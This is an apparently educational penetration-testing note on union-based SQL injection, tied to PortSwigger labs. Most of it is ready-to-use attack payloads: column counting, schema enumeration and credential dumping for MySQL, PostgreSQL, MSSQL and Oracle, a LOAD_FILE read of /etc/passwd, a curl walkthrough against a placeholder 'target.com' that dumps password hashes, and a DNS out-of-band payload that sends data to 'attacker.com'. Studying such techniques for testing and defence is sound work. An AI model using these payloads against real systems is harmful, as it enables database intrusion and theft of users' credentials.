---
tags: [vapt, sqli, intermediate]
difficulty: intermediate
module: "06 - SQL Injection"
topic: "06.04 Union-Based SQLi"
portswigger_labs: "SQL injection"
---

# 06.04 — Union-Based SQLi

## What is UNION-Based SQLi?

UNION SELECT appends a second SELECT query to the original. If the original query displays results on the page, our injected UNION SELECT results appear alongside (or instead of) them — giving us direct data output.

```
ORIGINAL QUERY (shows product info):
  SELECT name, price FROM products WHERE category = 'Electronics'

INJECTED (our query appended!):
  SELECT name, price FROM products WHERE category = 'Electronics'
  UNION
  SELECT username, password FROM users--

RESULT: page shows both products AND usernames/passwords!
```

---

## UNION Rules — What Must Match

```
TWO REQUIREMENTS FOR UNION TO WORK:

1. SAME NUMBER OF COLUMNS:
   SELECT a, b FROM table1
   UNION
   SELECT c, d FROM table2    ← must also have 2 columns!

2. COMPATIBLE DATA TYPES:
   Column 1 must be same type (or NULL works for anything)
   Column 2 must be same type (or NULL works for anything)

IF COLUMNS DON'T MATCH:
   Error: The used SELECT statements have a different number of columns
   → Add or remove NULLs until error goes away!
```

---

## Step 1: Determine Number of Columns

```sql
-- METHOD 1: ORDER BY (increment until error):
' ORDER BY 1--   → no error
' ORDER BY 2--   → no error
' ORDER BY 3--   → no error
' ORDER BY 4--   → ERROR! → original query has 3 columns!

-- METHOD 2: UNION NULL (add NULLs until no error):
' UNION SELECT NULL--             → error (1 col ≠ original cols)
' UNION SELECT NULL, NULL--       → error
' UNION SELECT NULL, NULL, NULL-- → NO ERROR! → 3 columns!

-- NOTE: On Oracle, UNION must select FROM a table:
' UNION SELECT NULL FROM dual--
' UNION SELECT NULL, NULL FROM dual--
```

---

## Step 2: Find Which Columns Are Visible

Not all columns display on the page. Find which ones you can see:

```sql
-- MARK EACH COLUMN WITH UNIQUE STRING:
' UNION SELECT 'col1visible', NULL, NULL--
' UNION SELECT NULL, 'col2visible', NULL--
' UNION SELECT NULL, NULL, 'col3visible'--

-- LOOK AT PAGE: Which string appears in the output?
-- e.g., 'col2visible' appears → column 2 is displayed!

-- SHORTCUT (mark all at once):
' UNION SELECT 'a','b','c'--
-- Page shows: a b c → see which position shows what value
```

---

## Step 3: Extract Data

```sql
-- DATABASE VERSION:
' UNION SELECT NULL, version(), NULL--

-- CURRENT DATABASE:
' UNION SELECT NULL, database(), NULL--   -- MySQL
' UNION SELECT NULL, current_database(), NULL--   -- PostgreSQL

-- CURRENT USER:
' UNION SELECT NULL, user(), NULL--

-- ALL DATABASES:
' UNION SELECT NULL, GROUP_CONCAT(schema_name), NULL 
  FROM information_schema.schemata--

-- ALL TABLES:
' UNION SELECT NULL, GROUP_CONCAT(table_name), NULL 
  FROM information_schema.tables 
  WHERE table_schema=database()--

-- ALL COLUMNS IN 'users' TABLE:
' UNION SELECT NULL, GROUP_CONCAT(column_name), NULL 
  FROM information_schema.columns 
  WHERE table_name='users'--

-- USERNAME AND PASSWORD DATA:
' UNION SELECT NULL, CONCAT(username, ':', password), NULL 
  FROM users--

-- MULTIPLE ROWS:
' UNION SELECT NULL, GROUP_CONCAT(username, ':', password SEPARATOR '\n'), NULL 
  FROM users--
```

---

## String Concatenation for Single-Column Output

When only ONE column is visible, concatenate multiple values:

```sql
-- MYSQL:
' UNION SELECT CONCAT(username, ':', password) FROM users--
' UNION SELECT CONCAT(username, 0x3a, password) FROM users--   -- 0x3a = ':'

-- POSTGRESQL:
' UNION SELECT username || ':' || password FROM users--

-- MSSQL:
' UNION SELECT username + ':' + password FROM users--

-- GROUP_CONCAT for all rows (MySQL):
' UNION SELECT GROUP_CONCAT(username, ':', password SEPARATOR ', ') FROM users--
```

---

## Database-Specific UNION Payloads

### MySQL

```sql
-- VERSION:
' UNION SELECT NULL, @@version, NULL--

-- FILE READ (requires FILE privilege!):
' UNION SELECT NULL, LOAD_FILE('/etc/passwd'), NULL--

-- INFO_SCHEMA:
' UNION SELECT NULL, table_name, NULL FROM information_schema.tables WHERE table_schema=database()--

-- ALL IN ONE (when 2 cols):
' UNION SELECT version(), GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()--
```

### PostgreSQL

```sql
-- VERSION:
' UNION SELECT NULL, version(), NULL--

-- TABLES:
' UNION SELECT NULL, string_agg(tablename, ','), NULL FROM pg_tables WHERE schemaname='public'--

-- COLUMNS:
' UNION SELECT NULL, string_agg(column_name, ','), NULL 
  FROM information_schema.columns WHERE table_name='users'--

-- DATA:
' UNION SELECT NULL, username || ':' || password, NULL FROM users LIMIT 1--
```

### MSSQL

```sql
-- VERSION:
' UNION SELECT NULL, @@version, NULL--

-- DATABASES:
' UNION SELECT NULL, name, NULL FROM master..sysdatabases--

-- TABLES:
' UNION SELECT NULL, name, NULL FROM sysobjects WHERE xtype='U'--

-- DATA:
' UNION SELECT NULL, username+':'+password, NULL FROM users--
```

### Oracle

```sql
-- (Oracle requires FROM dual for SELECT without table):
' UNION SELECT NULL, NULL FROM dual--

-- VERSION:
' UNION SELECT NULL, banner FROM v$version WHERE ROWNUM=1--

-- TABLES:
' UNION SELECT NULL, table_name FROM all_tables WHERE ROWNUM=1--

-- DATA:
' UNION SELECT NULL, username||':'||password FROM users WHERE ROWNUM=1--
```

---

## Full Exploitation Example

```bash
# TARGET: https://target.com/shop?category=Electronics

# Step 1: Detect SQLi
curl "https://target.com/shop?category=Electronics'"
# → SQL syntax error in response!

# Step 2: Count columns
curl "https://target.com/shop?category=Electronics' ORDER BY 1--"
curl "https://target.com/shop?category=Electronics' ORDER BY 2--"
curl "https://target.com/shop?category=Electronics' ORDER BY 3--"
# ORDER BY 3 → error! → 2 columns!

# Step 3: Find visible column
curl "https://target.com/shop?category=Electronics' UNION SELECT 'col1','col2'--"
# Page shows: "col2" → column 2 is visible!

# Step 4: Get version
curl "https://target.com/shop?category=Electronics' UNION SELECT NULL, version()--"

# Step 5: Get tables
curl "https://target.com/shop?category=Electronics' UNION SELECT NULL, GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()--"
# → products,users,orders,sessions

# Step 6: Get columns from users
curl "https://target.com/shop?category=Electronics' UNION SELECT NULL, GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'--"
# → id,username,password,email,is_admin

# Step 7: Dump credentials
curl "https://target.com/shop?category=Electronics' UNION SELECT NULL, GROUP_CONCAT(username,':',password) FROM users--"
# → admin:5f4dcc3b5aa765d61d8327deb882cf99,alice:2b003f9b1a1d4c3e,...
```

---

## UNION + DNS Out-of-Band

When response isn't visible but DNS requests are possible:

```sql
-- MYSQL (requires FILE privilege):
' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker.com\\x'))--
-- → DNS query: databasename.attacker.com → captured!
```

---

## Related Notes
- [[01 - What is SQL Injection]] — SQLi fundamentals
- [[03 - Error-Based SQLi]] — error-based extraction
- [[05 - Blind SQLi Boolean-Based]] — when no output is visible
- [[23 - Extracting Schema Tables Columns]] — full extraction workflow
- [[21 - sqlmap Full Usage Guide]] — automate UNION detection
